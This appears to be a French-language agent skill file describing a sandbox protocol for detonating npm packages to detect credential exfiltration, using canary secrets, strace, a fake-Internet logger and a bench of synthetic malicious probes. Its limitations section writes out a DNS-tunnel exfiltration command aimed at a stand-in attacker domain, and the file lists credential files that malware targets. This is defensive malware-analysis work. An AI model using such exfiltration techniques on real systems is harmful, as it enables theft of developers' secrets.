---
name: sandbox-detonation-npm
description: Use when detonating npm packages to prove exfiltration.
---

# Détonation npm — prouver ou innocenter par l'exécution

Le statique trie, la sandbox juge. Mais une sandbox qui ne fait que `require()`
ne juge rien : elle regarde. Cette skill décrit la seule forme de détonation qui
produit une **preuve** (quel secret sort, vers quel hôte) ou une **absence
étayée**, et les pièges qui transforment un run en faux négatif.

Tant que le banc de sondes ne mesure pas la sandbox, un « rien vu » ne vaut rien :
commencer par le banc, puis durcir.

## Règle d'or : faire relire AVANT de lancer

Tout run de plus d'une heure est relu par **deux modèles différents** (Mistral
et hy4 en second vérificateur) sur le script et le pilote exacts. Un protocole
faux coûte des heures et produit des chiffres faux. Poser des questions fermées
(BLOQUANT / NON BLOQUANT) et exiger la ligne à corriger.

## Les trois couches

1. **disque** : snapshot avant/après sur des racines nommées ;
2. **système** : `strace -f` sans filtre ;
3. **applicatif** : harnais qui journalise les canaux (`require`, `fs.*`,
   `child_process.execSync`, `net.connect`, `https.request`, `processus`).

Un quatrième journal, le **faux-Internet**, enregistre chaque requête (SNI,
chemin, en-têtes, corps) : c'est lui qui porte la preuve.

## Le scénario qui déclenche (scripts/sbx-scenario3.sh)

Un pilote remplace temporairement `main`, sans toucher au code du paquet :

- écrit **12 états de victime** avec des canaris distincts (npmrc, ssh, aws, gh,
  docker, kube, git, env, gcloud, session WhatsApp, cookies, historique) ;
- **plafonne `setTimeout`/`setInterval`** à 1,5 s (un appel à 3 jours part) ;
- exécute les scripts **preinstall/install/postinstall/prepare** — `require()`
  ne les exécute jamais, c'est le vecteur n°1 ;
- exécute les **`bin`** (`--help`, `--version`) ;
- charge le vrai point d'entrée (**ESM par `await import()`**) et pilote ses
  exports avec une session factice + `connection.update`/`messages.upsert`.

La preuve se lit dans `scripts/cles_scenario3.py` : un canari dans un événement
**réseau** vers un hôte ≠ registry, ou dans une commande exécutée.

## Les treize pièges (tous mesurés)

0. **`exports` prime sur `main`** : Node l'ignore. Lister `main`/`index.js` d'abord
   fait charger un leurre bénin et rater la charge utile. Ordre = `exports` d'abord.
   Corollaire : charger **toutes** les entrées (import ET require), pas la première.
1. `npm install --ignore-scripts` : neutralise le vecteur n°1. Installer sans
   scripts sur l'hôte (réseau), puis **rejouer les scripts dans le conteneur** —
   ceux du paquet **et ceux des dépendances** (liste `_sbx_deps_scripts.json`
   construite après installation, 20 scripts max, 3 s chacun).
2. Timeout de 30 s : un `setTimeout` de 3 jours ne se déclenche jamais. Plafonner
   les globales, `require('node:timers')` **et** `timers/promises` — `setTimeout`,
   `setInterval` et `scheduler.wait` : chaque variante oubliée est un timer libre.
   Intercepter `Module._load`, pas seulement les globales.
3. Canari cherché dans `events.jsonl` : le pilote écrit lui-même les fichiers,
   donc **12 faux positifs par paquet**. Ne compter que le réseau.
4. Canari envoyé au **registry** : seul le **jeton npm** y est un usage normal
   (un script qui appelle npm relit `~/.npmrc`). Une session WhatsApp, une clé SSH
   ou des cookies envoyés au registry restent une fuite : ne jamais exempter
   l'hôte entier, exempter le seul canari du jeton. Comparer l'hôte par
   **égalité** (`registry.npmjs.org.attaquant.test` n'est pas le registry).
5. Jeton que le harnais pose lui-même (`CANARI_FACTICE`) : l'exclure.
6. `main` remplacé puis `require(P)` : le pilote **se require lui-même** et rend
   `{}`. Jamais `require(P)`.
7. Paquet `type: module` : un pilote `.js` meurt (`require is not defined`).
   Pilote en `.cjs`, cible chargée par `await import()`.
8. `execSync` à `timeout: 25000` × 4 scripts + × 8 bins : 196 s bloquants pour
   un run de 90 s. Budget global, 8 s par script, 4 s par bin.
9. « Rien vu » sans trace de progression : indistinguable de « jamais exécuté ».
   Écrire la trace dans le **répertoire que le harnais ramène** (`/work/out`),
   jamais dans le paquet : le dossier du paquet n'est pas copié après le run et
   la trace disparaît avec le conteneur (voir aussi le piège 15).
10. Le harnais porte l'URL et le corps dans `valeur`, pas dans `url`/`chemin`.
    Chercher les preuves là aussi, sinon une sonde qui atteint son hôte reste « — ».
11. Compter « toute valeur contenant un point » comme une URL **fabrique des clés**.
    Extraire les URL, parser l'hôte.
12. Un banc sans témoin propre ne mesure rien : la sonde témoin doit rester muette,
    sinon chaque « amélioration » peut être une machine à faux positifs. La placer
    **en dernier** dans la liste pour que sa vérification soit positionnelle.
13. Énumérer `node_modules` à plat rate **tous les paquets scopés**
    (`node_modules/@scope/nom`) : la moitié de l'écosystème n'est alors jamais
    inspectée. Descendre d'un niveau dans les dossiers `@*`.
14. Une sonde qui ne parse pas rend « — » : c'est un faux négatif du **banc**, pas
    une force de la sandbox, et il pousse à « corriger » un trou qui n'existe pas.
    Deux causes vues : du JS fabriqué depuis une chaîne hôte où les guillemets
    imbriqués cassent le fichier, et une modification de sonde non revérifiée.
    Règle : garder les charges utiles **sans guillemets imbriqués** (construire les
    chaînes par concaténation ou `String.fromCharCode`, passer les chemins par
    variable), puis `node --check` sur **chaque** sonde générée avant de croire au
    banc. Une sonde doit d'abord être détectée par construction ; si elle ne l'est
    pas, suspecter la sonde avant la sandbox.
15. Un paramètre de scénario passé par **variable d'environnement** est perdu en
    silence : `sudo` réinitialise l'environnement (`VAR=x sudo -n bash script.sh`
    ne transmet rien) et le harnais lance la cible avec un environnement contrôlé.
    Symptôme : la sonde reste muette exactement comme si le paramètre valait zéro.
    Transmettre par **fichier** déposé à côté du pilote (`_sbx_offset.json`) et lu
    au démarrage, ou par `sudo -n env VAR=… bash …` pour ce qui pilote les
    processus extérieurs (docker, timeout).

## Le banc de sondes (scripts/fabrique_sondes.py)

Treize classes malveillantes + un témoin : postinstall, ESM, timer 3 jours, bin
seul, jeton npm, config C2, `exports` sans `main`, payload `eval`, shell+curl,
hook auto-installé, session WhatsApp, **charge utile dans `exports` derrière un
`index.js` bénin**, **postinstall d'une dépendance**. Note de départ : 13/13 vues,
témoin muet.

## Audit en boucle (scripts/audit_sandbox_20.py)

Le protocole se durcit par **tours** : un panel de modèles relit le code exact et
rend des constats, puis le **banc est rejoué**. Le banc est le juge, le panel est
l'inspirateur : un constat n'est retenu que si le score tient et que le témoin
reste muet. Détail du panel, du format de constat et de la veille :
`references/audit-loop.md`.

## Limites assumées (à énoncer, pas à masquer)

- **Plafonner les délais n'est pas simuler le temps.** Un `setTimeout` de trois
  jours part en 1,5 s, mais `Date.now()` reste réel : une charge utile qui teste
  « 30 jours écoulés depuis l'installation » ne se déclenche pas. Un décalage
  d'horloge côté pilote est la piste ; tant qu'il n'est pas mesuré par une sonde
  dédiée, ne jamais l'annoncer comme acquis.
- **Tunnel DNS** : le faux-Internet voit SNI/HTTP, pas les requêtes UDP brutes.
  Un `dig TXT <base32>.attaquant.tld` passe sous le journal sans laisser de trace.
- **Phase d'installation** : installée hors sandbox (`--ignore-scripts`) puis
  rejouée ; l'ordre npm réel, les builds natifs et les résolutions transitives ne
  sont pas observés.

## Concurrents et inspiration

La cartographie des dépôts qui font la même chose, ce qu'ils font mieux, ce qu'il
ne faut PAS copier, et la recette pour les lire sans brûler le quota GitHub :
`references/concurrents.md`.

## Ce qu'un « rien » veut dire

Aucun canari sorti, aucun hôte hors registry, aucun `exec` inattendu, sous
scripts de cycle de vie + bins + exports pilotés + délais écrasés : c'est une
**absence étayée**, pas une innocence. La formuler ainsi, jamais « le paquet
est propre ».

## Dépôt dédié

Le protocole complet, les scripts réels et le journal d'audit vivent sur
`github.com/boris21dd-sketch/sandbox-detonation-npm`. Toute amélioration y est
publiée avec sa mesure (`scripts/publier.sh "titre" "avant → après"`), pour que
l'historique dise ce qui a été corrigé **et ce que ça a changé**.

## Module d'entrée, pas seulement require()

`require.main === module` est **faux** sous `require()` : un loader gardé par ce
test reste invisible pour un harnais qui se contente de charger les entrées. Le
pilote exécute donc aussi le vrai `main` comme **processus node** (`entree`),
puis laisse une **fenêtre de settle** (~8 s, silencieuse) pour les charges
détachées (`spawn detached`, `unref`) qui rendent la main tout de suite.

Preuve exigée : sonde `p16-main-module` qui ne frappe QUE sous `require.main`
— muette avant la passe, CLÉ après. Un banc sans cette sonde ne prouve rien.

## Horloge accélérée (mois/années)

Plafonner les délais ne suffit pas : une charge qui compare des dates
(`Date.now() - installe > 30 jours`) ne se déclenche jamais. Le pilote décale
donc l'horloge du paquet (`_sbx_offset.json` à côté du pilote, `SBX_OFFSET_JOURS`).
**Deux pièges mesurés :**

- **Le budget du harnais doit lire la VRAIE horloge.** En décalant `Date.now()`
  globalement, `reste()` voit 30 jours écoulés et saute tout, vrai code compris :
  la sonde reste muette pour la mauvaise raison. Capturer `VRAI_NOW_MS` avant le
  décalage et l'utiliser pour le budget uniquement.
- **`sudo` ne propage pas l'environnement.** Les paramètres de scénario passent
  par `sudo -n env VAR=... bash detoner-obs.sh`, et à l'intérieur du conteneur par
  un **fichier** (l'environnement du paquet est contrôlé par le harnais).

Contrôle obligatoire : installé il y a 1 jour + offset 0 → muet ; même paquet +
offset 30 → la sonde frappe. Sans ce couple, le test ne prouve rien.

## Enchaînement

0. Construire ou rejouer le banc **avant** de promettre quoi que ce soit :
   `python3 scripts/fabrique_sondes.py` puis
   `bash scripts/sbx-scenario3.sh /tmp/liste_sondes.tsv <prefixe> 120`.
1. `bash scripts/sbx-scenario3.sh <liste.tsv nom\ttgz> <prefixe> 120`
2. `python3 scripts/cles_scenario3.py <prefixe>` → une ligne par paquet, `CLÉ`
   ou `—`, avec les hôtes et les canaris sortis.
3. Verser les clés dans le rapport ; ne jamais promouvoir une règle statique sur
   la base d'un run partiel. **Recompter mécaniquement tout total annoncé**
   (« 6 sur 12 ») depuis les fichiers de résultats, jamais de mémoire : un
   décompte faux invalide tout le reste du rapport, même si les règles sont justes.
